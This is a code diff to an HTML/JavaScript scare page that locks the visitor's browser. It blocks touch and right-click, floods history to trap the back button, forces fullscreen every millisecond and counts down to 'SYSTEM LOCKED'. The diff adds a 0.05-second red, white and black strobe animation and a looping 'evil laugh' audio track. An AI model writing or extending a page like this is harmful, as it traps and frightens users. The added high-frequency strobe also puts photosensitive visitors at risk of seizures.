@@ -7,7 +7,7 @@
 <style>
 body { margin:0; padding:0; background:#000; color:#0f0; font-family:'Courier New',monospace; overflow:hidden; height:100vh; user-select:none; touch-action:none; }
 #start { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); font-size:2.5rem; color:#0f0; z-index:10; text-align:center; }
-#overlay { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.95); display:none; flex-direction:column; justify-content:center; align-items:center; text-align:center; animation:flicker 0.1s infinite alternate; pointer-events:auto; z-index:10; }
+#overlay { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.95); display:none; flex-direction:column; justify-content:center; align-items:center; text-align:center; animation:flicker 0.1s infinite alternate, strobe 0.05s infinite; pointer-events:auto; z-index:10; }
 h1 { font-size:4.5rem; color:#f00; text-shadow:0 0 20px #f00; margin:0; animation:glitch 1s infinite; }
 p { font-size:1.6rem; max-width:90%; line-height:1.8; }
 .countdown { font-size:3.5rem; color:#f00; margin:30px 0; }
@@ -15,6 +15,13 @@ p { font-size:1.6rem; max-width:90%; line-height:1.8; }
 @keyframes glitch { 0%{text-shadow:3px 3px #0ff,-3px -3px #f0f;} 50%{text-shadow:-3px -3px #0ff,3px 3px #f0f;} 100%{text-shadow:3px 3px #0ff,-3px -3px #f0f;} }
 .matrix { position:absolute; top:0; left:0; right:0; bottom:0; opacity:0.15; background:repeating-linear-gradient(0deg,#0f0,#0f0 1px,transparent 1px,transparent 2px); animation:rain 8s linear infinite; pointer-events:none; z-index:1; }
 @keyframes rain { 0%{transform:translateY(-100%);} 100%{transform:translateY(100%);} }
+/* Rapid strobe: blood red, black, white */
+@keyframes strobe {
+  0% { filter: brightness(1) hue-rotate(0deg) invert(0); background:rgba(0,0,0,0.95); }
+  33% { filter: brightness(1.5) hue-rotate(0deg) invert(0); background:#300; } /* Blood red tint */
+  66% { filter: brightness(2) hue-rotate(180deg) invert(1); background:#fff; color:#000; } /* White flash */
+  100% { filter: brightness(1) hue-rotate(0deg) invert(0); background:rgba(0,0,0,0.95); }
+}
 #topBlocker { position:fixed; top:0; left:0; right:0; height:250px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
 #bottomBlocker { position:fixed; bottom:0; left:0; right:0; height:250px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
 </style>
@@ -34,6 +41,10 @@ p { font-size:1.6rem; max-width:90%; line-height:1.8; }
 <div id="topBlocker"></div>
 <div id="bottomBlocker"></div>
 
+<audio id="laugh" loop>
+  <source src="https://cdn.pixabay.com/download/audio/2022/03/24/audio_4b3d8e5c5e.mp3?filename=evil-laugh-1-126125.mp3" type="audio/mpeg">
+</audio>
+
 <script>
 let time = 20;
 let lockdownActive = false;
@@ -42,6 +53,7 @@ const overlay = document.getElementById('overlay');
 const countdown = document.getElementById('countdown');
 const topBlocker = document.getElementById('topBlocker');
 const bottomBlocker = document.getElementById('bottomBlocker');
+const laugh = document.getElementById('laugh');
 
 document.body.addEventListener('touchstart', startLockdown, {once: true});
 document.body.addEventListener('click', startLockdown, {once: true});
@@ -56,10 +68,13 @@ async function startLockdown(e) {
 
   requestFullScreen();
 
+  // Play creepy evil laugh on loop
+  laugh.volume = 0.5;
+  laugh.play();
+
   // Max touch freeze
   document.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
   document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
-  document.addEventListener('touchend', e => e.preventDefault(), { passive: false });
 
   // Back block
   for(let i = 0; i < 500; i++) {
@@ -67,12 +82,8 @@ async function startLockdown(e) {
   }
   window.onpopstate = () => history.pushState(null, null, location.href);
 
-  // FORCE fullscreen every millisecond during lockdown
-  const forceInterval = setInterval(() => {
-    if (lockdownActive && !document.fullscreenElement) {
-      requestFullScreen();
-    }
-  }, 1); // Every millisecond re-check and re-enter
+  // Force fullscreen constantly
+  const forceInterval = setInterval(requestFullScreen, 1);
 
   const timer = setInterval(() => {
     time--;
@@ -81,6 +92,7 @@ async function startLockdown(e) {
       clearInterval(timer);
       clearInterval(forceInterval);
       countdown.textContent = "SYSTEM LOCKED";
+      laugh.pause();
       endLockdown();
     }
   }, 1000);
@@ -102,4 +114,4 @@ function endLockdown() {
 document.addEventListener('contextmenu', e => e.preventDefault());
 </script>
 </body>
-                       </html>
+</html>
